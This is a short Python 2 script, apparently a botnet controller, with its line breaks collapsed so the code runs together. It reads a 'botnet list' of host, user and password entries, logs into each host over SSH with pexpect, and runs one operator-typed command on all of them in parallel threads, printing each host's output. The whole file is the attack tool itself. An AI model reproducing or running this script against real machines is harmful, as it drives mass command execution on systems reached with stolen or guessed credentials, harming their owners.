from pexpect import pxsshimport threadingimport argparseclass Botnet():    def __init__(self,host,user,passw,command):        self.host = host        self.user = user        self.password = passw        self.session = self.Login()        if self.session !=False:            self.SendCommand(command)    def Login(self):        try:            s = pxssh.pxssh()            s.login(self.host,self.user,self.password)            return s        except Exception as e:            print "!!! ssh {}@{} Error".format(self.user,self.host)            return False            #print "Error this {}@{}".format(self.user,self.host)    def SendCommand(self,command):        self.session.sendline(command)        self.session.prompt()        print "-" * 50        print "\n"        print "{}@{} commands' output ".format(self.user,self.host)        print self.session.beforeif __name__ == "__main__":    parser = argparse.ArgumentParser()    parser.add_argument("--b","--botnet-list",help="Please enter the current botnet list")    args = parser.parse_args()    with open(args.b , "r") as file:        computer_list = file.readlines()    try:        command = raw_input("Please enter the command which you want to output from botnet: ")        print "\n"    except KeyboardInterrupt:        print("\n")        exit(0)    for i in computer_list:        t = threading.Thread(target=Botnet, args=( i.strip("\n").split(",")[0] , i.strip("\n").split(",")[1] , i.strip("\n").split(",")[2],command))        t.start()